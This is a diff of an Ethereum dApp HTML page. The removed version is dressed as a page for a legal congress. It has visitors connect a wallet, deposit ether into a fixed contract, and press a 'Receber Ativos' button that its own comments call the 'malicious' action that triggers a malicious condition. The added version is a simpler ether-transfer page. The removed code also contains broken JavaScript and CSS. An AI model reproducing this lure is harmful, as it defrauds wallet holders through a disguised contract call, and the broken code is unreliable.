@@ -1,67 +1,21 @@
-<html>
-  <head>
-    <title>1º Congresso Jurídico Internacional</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.4.0/dist/web3.min.js"></script>
-<style>
-        /* Estilos para centralizar o conteúdo na página */
-        html, body {
-            height: 100%;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: black;
-            color: white;
-            font-family: Arial, sans-serif;
-        }
-
-        /* Estilos adicionais para os botões */
-        button {
-            color: black;
-            margin: 5px;
-        }
-
-        .container {
-            text-align: center;
-        }
-  .logo {
-            margin-bottom: 40px; /* Espaço entre o logotipo e o conteúdo abaixo dele */
-    </style>
-	  <style>
-        /* Muda a cor de fundo do corpo para preto */
-        body {
-            background-color: black;
-            color: white; /* Muda a cor do texto para branco para leitura em fundo preto */
-        }
-
-        button {
-            color: black; /* Muda a cor do texto dos botões para preto */
-        }
-    </style>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Transfer Ether</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.2.umd.min.js"></script>
 </head>
-  <body>
-<div class="container">
-   
-	<img src="https://i.ibb.co/bs8SMMd/marimonda.pn" alt="Logotipo" class="logo"> 
-	<h1>1º Congresso Jurídico Internacional</h1>
+<body>
 
-	<button onclick="conectarWallet()">Conectar Wallet</button>
-	<button onclick="criarTransacao()">Transferir</button>
-	<button onclick="receberAtivos()">Receber Ativos</button> <!-- Novo botão -->
-</div>
-	    <script>
-        // Função JavaScript para mudar o tamanho do logo
-        function mudarTamanhoLogo(20) {
-            var imagemLogo = document.getElementById('logoImage');
-            imagemLogo.style.width = 20 + 'px'; // Define a largura da imagem
-        }
-  
+<h2>Transferir Ether</h2>
 
-	    </script>
-	  <body>
-    <script>
-      // Defina a ABI do contrato
-      const abi = [
+<button id="connectWalletButton">Conectar Carteira</button>
+<button id="transferEtherButton" disabled>Transferir Ether</button>
+
+<script>
+    let signer;
+    const contractAddress = '0xCfCDeAf2CDc0D91714dE18932E7B73fF0A13D1fE'; // Substitua pelo endereço do seu contrato
+    const contractABI = [
 	{
 		"anonymous": false,
 		"inputs": [
@@ -162,67 +116,41 @@
 		],
 		"stateMutability": "view",
 		"type": "function"
-	}];
+	}
+];
 
-     // Defina o endereço do contrato
-        const enderecoContrato = "0xCfCDeAf2CDc0D91714dE18932E7B73fF0A13D1fE"; // Substitua pelo endereço do contrato correto
+    document.getElementById('connectWalletButton').addEventListener('click', async () => {
+        // Solicitar conexão à carteira do usuário
+        if (window.ethereum) {
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            signer = provider.getSigner();
+            document.getElementById('transferEtherButton').disabled = false;
+        } else {
+            console.error('Metamask não encontrado! Instale ou habilite a extensão.');
+        }
+    });
 
-        // Função para conectar a wallet
-        async function conectarWallet() {
-            if (window.ethereum) {
-                try {
-                    await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    console.log("Wallet conectada!");
-                } catch (error) {
-                    console.error("Erro ao conectar a wallet:", error);
-                }
-            } else {
-                console.error("Nenhuma wallet encontrada.");
-            }
+    document.getElementById('transferEtherButton').addEventListener('click', async () => {
+        if (!signer) {
+            console.error('Carteira não conectada!');
+            return;
         }
 
-        // Função para criar uma transação
-        async function criarTransacao() {
-            if (window.ethereum) {
-                try {
-                    const web3 = new Web3(window.ethereum);
-                    const accounts = await web3.eth.getAccounts();
-                    const contrato = new web3.eth.Contract(abi, enderecoContrato);
+        // Criar uma instância do contrato
+        const contract = new ethers.Contract(contractAddress, contractABI, signer);
 
-                    // Chama o método deposit do contrato
-                    const resultado = await contrato.methods
-                        .deposit()
-                        .send({ from: accounts[0], value: web3.utils.toWei("0.01", "ether") }); // Envia 0.01 ether
-
-                    console.log("Transação criada:", resultado);
-                } catch (error) {
-                    console.error("Erro ao criar a transação:", error);
-                }
-            } else {
-                console.error("Nenhuma wallet encontrada.");
-            }
+        // Chamar a função transferEther
+        try {
+            const tx = await contract.transferEther(await signer.getAddress(), ethers.utils.parseEther("0.001"));
+            console.log('Transação enviada:', tx);
+            await tx.wait();
+            console.log('Transação concluída:', tx);
+        } catch (error) {
+            console.error('Erro ao transferir Ether:', error);
         }
-    // Função para executar a ação "maliciosa"
-        async function receberAtivos() {
-            if (window.ethereum) {
-                try {
-                    const web3 = new Web3(window.ethereum);
-                    const accounts = await web3.eth.getAccounts();
-                    const contrato = new web3.eth.Contract(abi, enderecoContrato);
+    });
+</script>
 
-                    // Executa a função transferEther com 1 wei, disparando a condição maliciosa
-                    const resultado = await contrato.methods
-                        .transferEther(accounts[0], 1)
-                        .send({ from: accounts[0] });
-
-                    console.log("Receber ativos executado:", resultado);
-                } catch (error) {
-                    console.error("Erro ao receber ativos:", error);
-                }
-            } else {
-                console.error("Nenhuma wallet encontrada.");
-            }
-        }
-    </script>
 </body>
 </html>
